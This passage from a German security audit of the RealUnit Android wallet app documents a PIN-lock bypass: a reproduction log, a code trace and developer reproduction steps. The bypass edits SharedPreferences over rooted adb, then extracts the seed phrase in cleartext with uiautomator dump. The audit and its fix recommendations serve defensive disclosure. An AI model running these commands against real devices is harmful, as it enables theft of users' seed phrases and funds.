- Plus Cross-Wallet-Schaden bei Power-Usern mit wiederverwendeter Mnemonic.

**Empfohlene Fix-Reihenfolge:**
- NEW-4 zuerst (User-Auth-Gating des Mnemonic-Keys via Android-Keystore-CryptoObject) — eliminiert beide Pfade auf der kryptographischen Ebene, unabhängig davon ob der Angreifer in die App-UI kommt.
- NEW-1 als zweites (Lockout-State in SecureStorage) — eliminiert den App-Lock-Bypass und den DoS-Nebeneffekt für den legitimen User.

**Geschätzter Implementierungsaufwand:** ~7–10 Arbeitstage für 1 Senior Dev inkl. Tests, Migration bestehender Installs und iOS-Plattform-Coverage. Plus externer Re-Audit empfohlen, um die Fixes zu validieren.

**Was dieses Dokument NICHT prüft (offene Fragen für finale Risikoeinschätzung):**
- DFX-Backend-Verhalten bei Sell mit fake-IBAN (IBAN-Whitelist gegen KYC).
- DFX-Auth-Token-Lifecycle (wie lange gilt eine `personal_sign`-Auth-Signatur serverseitig?).
- Hardware-Backed-Keystore-Verfügbarkeit auf den Devices der RealUnit-User (Telemetrie aus Beta-Phase?).
- iOS-Pfad nicht abgedeckt. Der Bericht ist Android-spezifisch (SharedPreferences-XML, `adb shell`, root-via-Magisk). iOS-Verwundbarkeit ist tendenziell geringer (Jailbreak-Verfügbarkeit auf aktuellem iOS limitiert), aber nicht null — separater Audit für iOS empfohlen.

---

## Anhang A0 — Praktische Reproduktion durchgeführt (2026-05-02)

Pfad A wurde am 2026-05-02 in einem Android-14-Emulator (API 34, ARM64, `google_apis`-Image) gegen die debug-APK des `develop @ 8e87709`-Branches reproduziert. Ergebnis: **erfolgreicher Total-Loss innerhalb von <10 Minuten ab dem Punkt, an dem der Angreifer Shell-Zugriff hat.**

### Reproduktions-Log

**Setup:**
- Emulator: `pixel_7` Profile, Android 14, ARM64, google_apis (rootbar via `adb root`).
- App: debug-APK, frisch via `flutter build apk --debug` aus `develop @ 8e87709`.
- Wallet erstellt mit Mnemonic: `cabbage knock point arrow perfect gym feel seek grit hammer laundry congress` (notiert beim Setup), Original-PIN: `654321`.
- App in den Hintergrund geschickt, Dashboard war aktiv.

**Angriff Schritt 1 — App killen, XML manipulieren:**
```bash
adb root
adb shell am force-stop swiss.realunit.app
adb shell "sed -i 's|<boolean name=\"flutter.isPinEnabled\" value=\"true\" />|<boolean name=\"flutter.isPinEnabled\" value=\"false\" />|' /data/data/swiss.realunit.app/shared_prefs/FlutterSharedPreferences.xml"
```

Verifikation des Edits:
```xml
<map>
    <boolean name="flutter.termsAccepted" value="true" />
    <boolean name="flutter.softwareTermsAccepted" value="true" />
    <long name="flutter.currentWalletId" value="1" />
    <boolean name="flutter.isPinEnabled" value="false" />
</map>
```

**Schritt 2 — App starten:**
```bash
adb shell am start -n swiss.realunit.app/.MainActivity
```

Nach ca. 8 Sekunden Boot zeigt `uiautomator dump`:
```
content-desc="Create your pin"
content-desc="Enter a 6-digit PIN to secure your wallet"
```

→ App auf PIN-Setup-Screen, **kein Verify-Screen mit Original-PIN-Abfrage**. Bestätigt die NEW-1-Schwachstelle.

**Schritt 3 — Neuen PIN `123456` setzen (Create + Confirm via input tap):**

Nach Setup:
```
content-desc="RealUnit Wallet"
content-desc="RealUnit Stockprice"
content-desc="CHF "
content-desc="1.42"
content-desc="Buy RealUnit"
```

→ Dashboard offen mit Original-Wallet-Daten (Address, Balance). Original-PIN `654321` ist überschrieben.

**Kein Biometric-Prompt:** Im Emulator ist kein Hardware-Fingerprint verfügbar; `_promptBiometricSetup` hat das geskipped (`isAvailable() == false`). Das ist auf einem rooted Real-Device anders, aber der Angreifer kann "Ablehnen" tappen und kommt trotzdem durch.

**Schritt 4 — Settings → Wallet backup → Step-up mit neuem PIN `123456`:**

Step-up-Screen erscheint:
```
content-desc="Enter your pin"
content-desc="Enter your PIN to view your seed phrase"
```

PIN `123456` eingegeben, Step-up-Auth erfolgreich. Anschliessend `uiautomator dump` auf dem Seed-Reveal-Screen:
```
content-desc="Wallet backup"
content-desc="Please write down your 12 recovery words..."
content-desc="Recovery Phrase"
content-desc="1.\ncabbage\n7.\nfeel\n2.\nknock\n8.\nseek\n3.\npoint\n9.\ngrit\n4.\narrow\n10.\nhammer\n5.\nperfect\n11.\nlaundry\n6.\ngym\n12.\ncongress\nTap here to view"
```

→ **Mnemonic identisch zur Original-Mnemonic.** Total-Loss verifiziert.

### Drei zusätzliche Live-Befunde

**B-1: `uiautomator dump` umgeht `FLAG_SECURE` komplett.**
Der `no_screenshot`-Plugin setzt FLAG_SECURE — verifiziert durch das Logcat-File `/data/user/0/swiss.realunit.app/shared_prefs/screenshot_pref.xml`. `adb exec-out screencap -p` liefert auf den Wallet-Screens tatsächlich schwarze Bilder. Aber `adb shell uiautomator dump` (Accessibility-Service) gibt den vollständigen UI-Tree mit allen Texten als `content-desc` zurück — inklusive der Mnemonic im Klartext.

Das ist ein Architektur-Eigenschaft von Android: FLAG_SECURE blockiert Screen-Capture und Casting auf Window-Ebene, schützt aber nicht vor Accessibility-Reads. Für sehbehinderte User ist das gewollt — für sensitive UI-Inhalte ist es eine Lücke. Die App müsste ergänzend `importantForAccessibility="no"` oder `excludeFromSemantics: true` (Flutter) auf den Mnemonic-Widgets setzen.

**Konsequenz:** Der Angreifer braucht für Pfad A **kein Frida** und muss den Seed nicht visuell abschreiben. `adb shell uiautomator dump /sdcard/d.xml && adb pull /sdcard/d.xml` reicht. Reduziert die Hürde von "Frida-Operator" zu "jemand mit `adb`-Wissen".

**B-2: Der Klartext-Seed ist sogar im Blur-State im UI-Tree lesbar.**
Das Mnemonic-Widget enthält die `content-desc` `"... 12. congress\nTap here to view"` — der Klartext-Seed UND die Aufforderung zum Reveal-Tap sind in derselben Element-Description. Der User muss den Blur nie selbst entfernen. Das `SeedBlurCard` verschleiert nur die visuelle Darstellung, nicht den semantischen Render-State.

Für die Praxis bedeutet das: Wer auf den Seed-Reveal-Screen kommt (egal ob via Pfad A oder durch Schulter-Surfing während ein legitimer User dort ist), bekommt den Seed via `uiautomator dump`, ohne dass der Tap zum Entblurren überhaupt nötig ist.

**B-3: Pre-Fill der Verify-Backup-Wörter im debug-Build.**
Beim Wallet-Setup erscheint nach der Mnemonic-Anzeige ein "Verify your backup"-Screen, der 4 Wörter abfragt. Im debug-Build sind die Antworten bereits in den Text-Feldern eingetragen (Code-Pfad in `verify_seed_cubit.dart:35` mit `kDebugMode`-Pre-fill). Das ist **nicht** sicherheitsrelevant — es ist eine Dev-Convenience und nur in Debug-Builds aktiv. Aber es ist ein Beleg, dass Debug-Builds andere Code-Pfade haben als Release-Builds — was bei der Reproduktion zu beachten ist. Pfad A funktioniert in beiden Build-Varianten gleich, weil `pin_auth_cubit.dart` und `setup_pin_cubit.dart` keine Debug-Flags haben.

### Total Time

Vom `am force-stop` bis zur exfiltrierten Mnemonic: **ca. 8 Minuten** in dieser Reproduktion. Davon:
- ~30 Sekunden für XML-Edit + App-Restart
- ~3 Minuten für PIN-Setup (Create + Confirm)
- ~1 Minute Navigation Settings → Wallet backup
- ~1 Minute Step-up-PIN-Eingabe + Reveal-Screen
- ~1 Minute UI-Dump + Mnemonic-Extraktion

Bei einem geübten Operator mit Skript-Automatisierung wäre das deutlich schneller (~2-3 Minuten). Im Reparatur-Lab oder Forensik-Setup mit fertigem Toolset entsprechend kürzer.

---

## Anhang A — Statisches Trace der Pfad-A-Logik

Anstelle einer praktischen Reproduktion (Toolchain-Setup-Aufwand) wurde der Code-Pfad statisch verfolgt, mit Fokus auf State-Maschinen-Übergänge und mögliche Validations-Gates, die den Angriff brechen könnten. Ergebnis:

### Initialisierungs-Reihenfolge beim App-Start (`main.dart`)

1. `setupEssentials()` — `secureStorage.getEncryptionKey()` liest DB-Key aus FSS. In Pfad A unverändert → DB-Key gefunden, kein Reset-Pfad triggered.
2. `finishSetup(databaseKey)` — DB wird geöffnet, Repositories und Services registriert.
3. `setupBlocs()` — `HomeBloc` wird mit sofortigem `add(LoadCurrentWalletEvent())` instanziiert. `PinAuthCubit..initialize()` wird mit `isPinSetup = settingsRepository.isPinEnabled` (false aus manipulierter XML) initialisiert → `isPinVerified: !false = true`.
4. `runApp(LifecycleInitializer(WalletApp()))`.
5. `_WalletAppState.initState()` registriert `addPostFrameCallback((_) => _navigate())`.

### Wallet-Loading-Flow (`HomeBloc._onLoadCurrentWallet`)

1. `emit(state.copyWith(isLoadingWallet: true, softwareTermsAccepted: ...));`
2. `if (state.openWallet != null || !_walletService.hasWallet()) { emit(...isLoadingWallet:false); return; }` — in Pfad A ist `state.openWallet == null` und `hasWallet() == true` (currentWalletId in SharedPrefs unverändert), Code läuft weiter.
3. `final wallet = await _walletService.getCurrentWallet();`
   - `_settingsRepository.currentWalletId!` — nicht null in Pfad A.
   - `getWalletById(id)` ruft `_repository.getWalletById(id)`.
   - `WalletRepository._decryptWalletInfo` ruft `_secureStorage.getOrCreateMnemonicKey()` — **kein User-Auth-Gate** (NEW-4).
   - `SecureStorage.decryptSeed(key, info.seed)` entschlüsselt AES-GCM mit dem aus FSS gelesenen Key.
   - Rückgabe: `WalletInfo` mit Mnemonic im Klartext.
   - `SoftwareWallet(result.id, result.name, result.seed)` — Constructor ruft `mnemonicToSeed(seed)` (PBKDF2). Bei korrekter Mnemonic kein Throw.
4. `_appStore.wallet = wallet;` — **Wallet ist jetzt im Memory verfügbar**, vor jeder PIN-Verifikation.
5. `emit(state.copyWith(openWallet: wallet, isLoadingWallet: false, onboardingCompleted: ...));`

**Mögliches Failure-Szenario:** Wenn `mnemonicToSeed` wegen korruptem Mnemonic wirft → Catch-Block, `state.copyWith(isLoadingWallet:false)`. `state.openWallet` bleibt null. In `_navigate()` führt das zu `OnboardingRoutes.welcome` (App-Reset). Der Angreifer würde auf den Welcome-Screen landen. **In reiner Pfad-A-Manipulation (nur SharedPrefs angefasst) wird Mnemonic NICHT korruptiert** — der Mnemonic-Encryption-Key in FSS bleibt intakt.

### Routing-Entscheidung (`main.dart:_navigate`)

Reihenfolge der Bedingungen:
1. `isLoadingWallet` → return ohne Navigation.
2. `!softwareTermsAccepted` → `AppRoutes.home` (legaler Welcome). Nicht in Pfad A.
3. `openWallet == null` → `OnboardingRoutes.welcome`. Nur bei Wallet-Load-Crash.
4. `!onboardingCompleted` → `OnboardingRoutes.completed`. Nicht in Pfad A (kommt aus `isTermsAccepted` SharedPref, unverändert).
5. **`!isPinSetup` → `PinRoutes.setup`. ← Pfad A landet hier.**
6. `!isPinVerified` → `PinRoutes.verify`. Nicht erreicht.
7. `else` → `AppRoutes.dashboard`.

### PIN-Setup-Flow (`SetupPinCubit._confirmPin`)

1. `final salt = SecureStorage.generatePinSalt();` — neuer 16-Byte-Random.
2. `final hash = SecureStorage.hashPin(confirmPin, salt);` — PBKDF2-HMAC-SHA256, 10000 Iterationen.
3. `_secureStorage.setPinSalt(salt)` und `setPinHash(hash)` — **überschreiben** alten Salt/Hash in FSS.
4. `_settingsRepository.isPinEnabled = true;` — schreibt `flutter.isPinEnabled=true` zurück in SharedPrefs.
5. `emit(state.copyWith(isComplete: true));`

### PIN-Setup-Complete → Dashboard

1. `setup_pin_page.dart:39-44`: `BlocConsumer.listener` reagiert auf `isComplete`.
2. `_promptBiometricSetup(context)` — fragt User. Bei „Nein"/Cancel: `enable()` returnt false, kein Throw, Flow setzt fort.
3. `getIt<PinAuthCubit>().onPinSetupComplete();` — emit `(isPinSetup: true, isPinVerified: true)`.
4. `BlocListener<PinAuthCubit>` in `main.dart:91-95` triggert `_navigate()`.
5. Alle Bedingungen erfüllt → `targetRoute = AppRoutes.dashboard`.

### Settings-Seed-Reveal

1. Dashboard → Settings → "Backup Wallet" Button.
2. `settings_page.dart:104-110` ruft `PinRoutes.gate` mit `VerifyPinParams.onAuthenticated`.
3. Step-up-PIN: User gibt den **neu** gesetzten PIN ein. `verifyPin` vergleicht gegen den **neuen** Hash in FSS — passt.
4. `enableLockout: false` (NEW-3) → kein Lockout, aber im Single-Try-Szenario irrelevant.
5. `onAuthenticated()` callback ruft `context.pushReplacementNamed(SettingsRoutes.seed)`.
6. `SettingsSeedPage` instanziiert `SettingsSeedCubit((getIt<AppStore>().wallet as SoftwareWallet))` — der Cast funktioniert, weil `_appStore.wallet` seit App-Start (nicht erst seit PIN-Setup) gesetzt ist.
7. `SettingsSeedCubit` initial-State: `SettingsSeedState(wallet.seed)` — die Klartext-Mnemonic.
8. `SeedBlurCard` zeigt `seed` (geblurt, bis User tappt). Auf rooted Device kann FLAG_SECURE per Frida-Hook umgangen werden.

### Trace-Ergebnis

**Keine zusätzlichen Validations-Gates gefunden, die Pfad A bremsen würden.** Der Code-Pfad ist konsistent mit der Beschreibung in §3 dieses Dokuments. Die einzigen Reset-Triggers (DB-Key-Mismatch, Wallet-Load-Exception) werden in Pfad A nicht aktiviert, weil der Angreifer den Mnemonic-Key in FSS nicht anfasst.

**Architektur-Beobachtung als Nebenergebnis:** `_appStore.wallet` ist seit dem ersten erfolgreichen `_onLoadCurrentWallet` global im Memory verfügbar — **vor** jeder PIN-Verifikation. Das ist eine separate Architektur-Schwäche, die unabhängig von NEW-4 besteht: Die App vertraut darauf, dass der App-Lock allein den UI-Zugriff auf das Wallet kontrolliert. Wenn der UI-Zugriff über `_navigate()`-Logik umgangen wird (durch direkte Route-Navigation, Deep-Link, oder die gefundene SharedPrefs-Manipulation), ist das Wallet-Objekt sofort verfügbar.

---

## Anhang B — Reproduktions-Anleitung für DFX-Mobile-Dev

Setup-Schritte, um Pfad A in einer kontrollierten Umgebung zu verifizieren. Geschätzte Zeit: ~1 Stunde inkl. Setup, vorausgesetzt Android Studio ist installiert.

### B.1 — AVD mit rootbarem Image erstellen

```bash
# Falls noch nicht installiert
sdkmanager --install "system-images;android-34;google_apis;x86_64"
sdkmanager --install "platform-tools" "emulator"

# AVD erstellen — wichtig: google_apis (nicht playstore), sonst kein root möglich
avdmanager create avd \
  --name realunit_test \
  --package "system-images;android-34;google_apis;x86_64" \
  --device "pixel_7"
```

### B.2 — Emulator starten und root-Verifikation

```bash
emulator -avd realunit_test -writable-system &
adb wait-for-device
adb root  # Sollte "restarting adbd as root" returnen
adb shell whoami  # → root
```

### B.3 — RealUnit-App bauen und installieren

```bash
cd ~/Documents/GitHub/dfx/realunit-app
flutter pub get
dart run tool/generate_localization.dart
flutter pub run build_runner build --delete-conflicting-outputs
flutter build apk --debug  # Debug-Build reicht für die Reproduktion
adb install build/app/outputs/flutter-apk/app-debug.apk
```

### B.4 — Wallet einrichten

App auf dem Emulator manuell:
1. Onboarding durchklicken, Software-Terms akzeptieren.
2. Neues Wallet erstellen.
3. Mnemonic notieren (z.B. in Klartext-Datei `~/realunit_test_mnemonic.txt`).
4. PIN setzen, z.B. `654321`.
5. Biometric optional aktivieren.
6. Im Dashboard angekommen, App in den Hintergrund schicken (Home-Button).

### B.5 — Pfad A durchführen

```bash
# 1. App killen
adb shell am force-stop swiss.realunit.app

# 2. shared_prefs inspizieren
adb shell run-as swiss.realunit.app cat /data/data/swiss.realunit.app/shared_prefs/FlutterSharedPreferences.xml
# (Da Debug-Build: run-as funktioniert; bei Release-Build: adb root + cat)

# 3. isPinEnabled auf false setzen
adb shell "su -c \"sed -i 's|<boolean name=\\\"flutter.isPinEnabled\\\" value=\\\"true\\\" />|<boolean name=\\\"flutter.isPinEnabled\\\" value=\\\"false\\\" />|' /data/data/swiss.realunit.app/shared_prefs/FlutterSharedPreferences.xml\""

# 4. App neu starten
adb shell am start -n swiss.realunit.app/.MainActivity
```

**Erwartetes Verhalten:** Statt PIN-Verify-Screen erscheint PIN-Setup-Screen.

### B.6 — Neuen PIN setzen und Mnemonic abrufen

Manuell auf dem Emulator:
1. Neuen PIN setzen, z.B. `123456`.
2. Biometric ablehnen.
3. Im Dashboard ankommen.
4. Settings → Backup Wallet → Step-up-PIN `123456` → Seed-Reveal.
5. Angezeigte Mnemonic mit `~/realunit_test_mnemonic.txt` vergleichen.

**Erwartetes Ergebnis:** Identische Mnemonic → Pfad A verifiziert.

### B.7 — Falls etwas nicht klappt: Debugging

- App startet auf Splash-Screen und friert ein → vermutlich Exception in `_onLoadCurrentWallet`. `adb logcat | grep -i flutter` zeigt den Stack-Trace.
- App geht direkt zum Welcome-Screen statt PIN-Setup → Wallet wurde nicht geladen, prüfen ob `currentWalletId` und `flutter.softwareTermsAccepted` noch in SharedPrefs gesetzt sind.
- PIN-Setup geht durch, aber Dashboard friert ein → BalanceService oder DFX-API-Aufruf scheitert. Für die Reproduktion irrelevant — Mnemonic-Reveal in Settings ist auch ohne erfolgreiches DFX-Auth zugänglich.

### B.8 — Cleanup

```bash
adb uninstall swiss.realunit.app
emulator -avd realunit_test -no-window -no-audio &
# oder
avdmanager delete avd --name realunit_test
```

---

*Dieses Dokument ist die technische Begleitung zum Follow-Up-Audit `docs/security-review-followup.md`. Es ergänzt die dort vergebenen Severity-Ratings um den konkreten Angriffspfad, das statische Trace-Ergebnis und die daraus folgende Empfehlung der Fix-Priorisierung.*
